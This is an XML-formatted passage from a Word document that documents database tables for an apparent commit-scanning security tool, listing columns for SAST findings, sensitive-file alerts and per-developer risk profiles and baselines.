          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>0=normal, 1=marked as FP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_commit_findings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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>scan_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER FK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>References github_commit_scans(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>rule_name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SAST rule name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>rule_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>References custom_rules(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>critical/high/medium/low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>file_path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>File containing the finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>line_number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Line number in diff</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>matched_text</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Matched code (truncated 200 chars)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>insider_threat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>diff_snippet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+/- 5 lines context (max 1500 chars)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>false_positive</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>0=normal, 1=marked as FP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_sensitive_file_alerts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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>scan_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER FK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>References github_commit_scans(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>file_path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Path to sensitive file</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>pattern_matched</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Regex pattern that matched</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit author</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>committed_at</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit timestamp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>acknowledged</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER DEFAULT 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>0=new, 1=acknowledged</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_developer_profiles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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT UNIQUE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developer identifier</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Display name</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>total_commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Total commits scanned</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>high_risk_commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commits with high/critical risk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>total_findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Total SAST findings across commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>risk_trend</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>increasing/decreasing/stable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>last_commit_at</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Most recent commit timestamp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_risk_score</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Rolling average risk score</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_developer_baselines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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT UNIQUE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developer identifier</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
